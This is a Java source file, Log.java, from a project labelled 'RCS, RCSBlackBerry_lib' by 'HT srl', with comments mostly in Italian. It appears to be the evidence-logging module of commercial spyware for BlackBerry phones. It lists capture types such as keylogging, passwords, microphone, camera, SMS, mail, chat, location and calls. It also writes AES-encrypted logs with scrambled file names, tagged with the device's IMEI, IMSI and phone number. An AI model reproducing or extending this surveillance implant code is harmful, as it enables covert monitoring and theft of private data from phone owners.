/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Log.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.log;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.Device;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.DateTime;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.rcs.blackberry.utils.WChar;

/*  LOG FORMAT
 *
 *  -- Naming Convention
 *  Il formato dei log e' il seguente:
 *  Il nome del file in chiaro ha questa forma: ID_AGENTE-LOG_TYPE-SEQUENCE.mob
 *  e si presenta cosi': xxxx-xxxx-dddd.mob
 *  Il primo gruppo e' formato generalmente da 4 cifre in esadecimali, il secondo
 *  e' formato generalmente da una cifra esadecimale, il terzo gruppo e' un numero
 *  di sequenza in formato decimale. Ognuno dei tre gruppi puo' essere composto da
 *  1 fino a 8 cifre. Il nome del file viene scramblato con il primo byte della
 *  chiave utilizzata per il challenge.
 *
 *  -- Header
 *  Il log cifrato e' cosi' composto:
 *  all'inizio del file viene scritta una LogStruct non cifrata, il membro FileSize indica la
 *  lunghezza complessiva di tutto il file. Dopo la LogStruct troviamo il filename in WCHAR,
 *  quindi i byte di AdditionalData se presenti e poi il contenuto vero e proprio.
 *
 *  -- Data
 *  Il contenuto e' formato da una DWORD in chiaro che indica la dimensione del blocco
 *  unpadded (va quindi paddata a BLOCK_SIZE per ottenere la lunghezza del blocco cifrato)
 *  e poi il blocco di dati vero e proprio. Questa struttura puo' esser ripetuta fino alla
 *  fine del file.
 *
 *  -- Global Struct
 *  |Log Struct|FileName|AdditionalData|DWORD Unpadded|Block|.....|DWORD Unpadded|Block|.....|
 *
 *  Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
 *
 */
public class Log {
    private static final int LOG_VERSION_01 = 2008121901;
    /*
     * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
     */
    public static final int LOGTYPE_UNKNOWN = 0xFFFF; // in caso di errore
    public static final int LOGTYPE_FILEOPEN = 0x0000;
    public static final int LOGTYPE_FILECAPTURE = 0x0001; // in realta' e'
    // 0x0000 e si
    // distingue tra LOG e
    // LOGF
    public static final int LOGTYPE_KEYLOG = 0x0040;
    public static final int LOGTYPE_PRINT = 0x0100;
    public static final int LOGTYPE_SNAPSHOT = 0xB9B9;
    public static final int LOGTYPE_UPLOAD = 0xD1D1;
    public static final int LOGTYPE_DOWNLOAD = 0xD0D0;
    public static final int LOGTYPE_CALL = 0x0140;
    public static final int LOGTYPE_CALL_SKYPE = 0x0141;
    public static final int LOGTYPE_CALL_GTALK = 0x0142;
    public static final int LOGTYPE_CALL_YMSG = 0x0143;
    public static final int LOGTYPE_CALL_MSN = 0x0144;
    public static final int LOGTYPE_CALL_MOBILE = 0x0145;
    public static final int LOGTYPE_URL = 0x0180;
    public static final int LOGTYPE_CLIPBOARD = 0xD9D9;
    public static final int LOGTYPE_PASSWORD = 0xFAFA;
    public static final int LOGTYPE_MIC = 0xC2C2;
    public static final int LOGTYPE_CHAT = 0xC6C6;
    public static final int LOGTYPE_CAMSHOT = 0xE9E9;
    public static final int LOGTYPE_ADDRESSBOOK = 0x0200;
    public static final int LOGTYPE_CALENDAR = 0x0201;
    public static final int LOGTYPE_TASK = 0x0202;
    public static final int LOGTYPE_MAIL = 0x0210;
    public static final int LOGTYPE_SMS = 0x0211;
    public static final int LOGTYPE_MMS = 0x0212;
    public static final int LOGTYPE_LOCATION = 0x0220;
    public static final int LOGTYPE_CALLLIST = 0x0230;
    public static final int LOGTYPE_DEVICE = 0x0240;
    public static final int LOGTYPE_INFO = 0x0241;
    public static final int LOGTYPE_APPLICATION = 0x1011;
    public static final int LOGTYPE_SKYPEIM = 0x0300;
    public static final int LOG_MAGIC_CALLTYPE = 0x0026;

    public static final int[] TYPE_LOG = new int[] { LOGTYPE_UNKNOWN,
            LOGTYPE_SMS, LOGTYPE_TASK,
            LOGTYPE_CALLLIST, // 0..3
            LOGTYPE_DEVICE, LOGTYPE_LOCATION, LOGTYPE_CALL,
            LOGTYPE_CALL_MOBILE, // 4..7
            LOGTYPE_KEYLOG, LOGTYPE_SNAPSHOT, LOGTYPE_URL, LOGTYPE_CHAT, // 8..b
            LOGTYPE_MAIL, LOGTYPE_MIC, LOGTYPE_CAMSHOT, LOGTYPE_CLIPBOARD, // c..f
            LOGTYPE_UNKNOWN, LOGTYPE_APPLICATION // 10..11
    };

    private static Debug debug = new Debug("Log", DebugLevel.VERBOSE);

    public static int convertTypeLog(int agentId) {
        int agentPos = agentId - Agent.AGENT;
        Check.requires(TYPE_LOG != null, "Null TypeLog");
        if (agentPos > 0 && agentPos < TYPE_LOG.length) {
            int typeLog = TYPE_LOG[agentPos];
            return typeLog;
        }

        debug.warn("Wrong agentId conversion: " + agentId);
        return LOGTYPE_UNKNOWN;
    }

    Date timestamp;
    String logName;

    int logType;

    String fileName;
    FileConnection fconn = null;

    DataOutputStream os = null;
    Encryption encryption;
    LogCollector logCollector;

    LogDescription logDescription;
    Device device;

    Agent agent;

    int progressive;

    private Log() {
        logCollector = LogCollector.getInstance();
        device = Device.getInstance();
        encryption = new Encryption();
        progressive = -1;
        // timestamp = new Date();
    }

    public Log(Agent agent_, byte[] aesKey) {
        this();

        this.agent = agent_;

        encryption.makeKey(aesKey);
    }

    public Log(Agent agent_, String aesKey) {
        this();

        this.agent = agent_;

        byte[] key = new byte[16];
        Utils.copy(key, 0, aesKey.getBytes(), 0, 16);

        encryption.makeKey(key);
    }

    /**
     * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
     * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
     * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
     * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
     * automaticamente l'handle.
     */
    public boolean close() {
        boolean ret = true;

        if (os != null) {
            try {
                os.close();
            } catch (IOException e) {
                ret = false;
            }
        }

        if (fconn != null) {
            try {
                fconn.close();
            } catch (IOException e) {
                ret = false;
            }
        }

        return ret;
    }

    /**
     * Questa funzione crea un file di log e lascia l'handle aperto. Il file
     * viene creato con un nome casuale, la chiamata scrive l'header nel file e
     * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
     * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
     * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
     * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
     * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
     * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
     * FALSE altrimenti.
     */
    public boolean createLog(byte[] additionalData) {
        timestamp = new Date();

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        Vector tuple = logCollector.makeNewName(this, agent);
        Check.asserts(tuple.size() == 4, "Wrong tuple size");

        this.progressive = ((Integer) tuple.elementAt(0)).intValue();
        String basePath = (String) tuple.elementAt(1);
        String blockDir = (String) tuple.elementAt(2);
        String encName = (String) tuple.elementAt(3);

        String dir = basePath + blockDir + "/";
        Path.createDirectory(dir);

        fileName = dir + encName;
        Check.asserts(fileName != null, "null fileName");

        try {
            fconn = (FileConnection) Connector.open(fileName);

            if (fconn.exists()) {
                debug.fatal("It should not exist:" + fileName);
                return false;
            }

            byte[] plainBuffer = makeDescription(additionalData);
            Check.asserts(plainBuffer.length >= 32 + additionalLen,
                    "Short plainBuffer");

            fconn.create();
            os = fconn.openDataOutputStream();

            byte[] encBuffer = encryption.encryptData(plainBuffer);
            Check.asserts(encBuffer.length == Encryption
                    .getNextMultiple(plainBuffer.length), "Wrong encBuffer");

            // scriviamo la dimensione dell'header paddato
            os.write(Utils.intToByteArray(plainBuffer.length));
            // scrittura dell'header cifrato
            os.write(encBuffer);
            os.flush();

            Check.asserts(fconn.fileSize() == encBuffer.length + 4,
                    "Wrong filesize");

            debug.trace("plainBuffer.length: " + plainBuffer.length);
            debug.trace("encBuffer.length: " + encBuffer.length);

        } catch (IOException ex) {
            return false;
        }

        return true;
    }

    // pubblico solo per fare i test
    public byte[] makeDescription(byte[] additionalData) {

        if (timestamp == null) {
            timestamp = new Date();
        }

        // Check.requires(timestamp != null, "null timestamp");
        // Check.requires(additionalData != null, "null additionalData");

        int additionalLen = 0;

        if (additionalData != null) {
            additionalLen = additionalData.length;
        }

        DateTime datetime = new DateTime(timestamp);

        logDescription = new LogDescription();
        logDescription.version = LOG_VERSION_01;
        logDescription.logType = convertTypeLog(agent.agentId);
        logDescription.hTimeStamp = datetime.hiDateTime();
        logDescription.lTimeStamp = datetime.lowDateTime();
        logDescription.additionalData = additionalLen;
        logDescription.deviceIdLen = device.getWImei().length;
        logDescription.userIdLen = device.getWImsi().length;
        logDescription.sourceIdLen = device.getWPhoneNumber().length;

        byte[] baseHeader = logDescription.getBytes();
        Check.asserts(baseHeader.length == logDescription.length,
                "Wrong log len");

        int headerLen = baseHeader.length + logDescription.additionalData
                + logDescription.deviceIdLen + logDescription.userIdLen
                + logDescription.sourceIdLen;
        byte[] plainBuffer = new byte[Encryption.getNextMultiple(headerLen)];

        DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
                plainBuffer.length, false);
        databuffer.write(baseHeader);
        databuffer.write(device.getWImei());
        databuffer.write(device.getWImsi());
        databuffer.write(device.getWPhoneNumber());

        if (additionalLen > 0) {
            databuffer.write(additionalData);
        }

        return plainBuffer;
    }

    /**
     * Override della funzione precedente: invece di generare il nome da una
     * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
     * una stringa vuota.
     */
    String makeName(int agentId, boolean addPath) {
        return null;
    }

    /**
     * Genera un nome gia' scramblato per un file log, se bAddPath e' TRUE il
     * nome ritornato e' completo del path da utilizzare altrimenti viene
     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
     * stringa vuota. Il nome generato non indica necessariamente un file che
     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
     * disponibile, se esiste.
     */
    String makeName(String name, boolean addPath, boolean storeToMMC) {
        return null;
    }

    /**
     * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
     * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
     * fine, FALSE altrimenti.
     */
    public boolean writeLog(byte[] data) {
        if (os == null || fconn == null) {
            debug.error("fconn or os null");
            return false;
        }

        byte[] encData = encryption.encryptData(data);

        try {
            os.write(Utils.intToByteArray(data.length));
            os.write(encData);
            os.flush();
        } catch (IOException e) {
            return false;
        }

        return true;
    }

    public boolean writeLog(String data, boolean endzero) {
        return writeLog(WChar.getBytes(data, endzero));
    }
}
